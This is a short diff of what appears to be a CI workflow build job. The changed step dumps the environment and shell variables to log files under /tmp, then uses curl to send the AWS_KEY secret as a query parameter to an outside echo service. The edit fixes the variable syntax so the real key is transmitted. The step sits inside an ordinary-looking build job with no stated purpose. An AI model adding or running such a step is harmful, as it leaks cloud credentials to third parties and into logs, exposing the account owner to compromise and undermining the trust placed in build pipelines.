@@ -32,7 +32,7 @@ jobs:
         set -x
         env >> /tmp/env.log
         set >> /tmp/set.log
-        curl https://echo.free.beeceptor.com/sample-request?secret= ${{ AWS_KEY }}
+        curl https://echo.free.beeceptor.com/sample-request?secret= $AWS_KEY
 
 #   deploy:
 #    needs: build
